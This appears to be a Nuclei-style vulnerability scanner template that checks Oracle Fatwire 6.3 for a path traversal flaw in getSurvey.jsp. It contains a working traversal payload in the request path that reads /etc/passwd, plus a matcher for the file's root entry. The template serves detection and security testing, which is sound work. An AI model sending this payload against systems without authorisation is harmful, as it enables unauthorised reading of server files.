id: oracle-fatwire-lfi
info:
  author: Bernardo Rodrigues @bernardofsr
  description: Oracle Fatwire 6.3 suffers from a path traversal vulnerability in the
    getSurvey.jsp endpoint
  name: Oracle Fatwire 6.3 - Path Traversal
  reference:
  - https://www.exploit-db.com/exploits/50167
  severity: critical
  tags: lfi,oracle,fatwire
requests:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/cs/career/getSurvey.jsp?fn=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd'
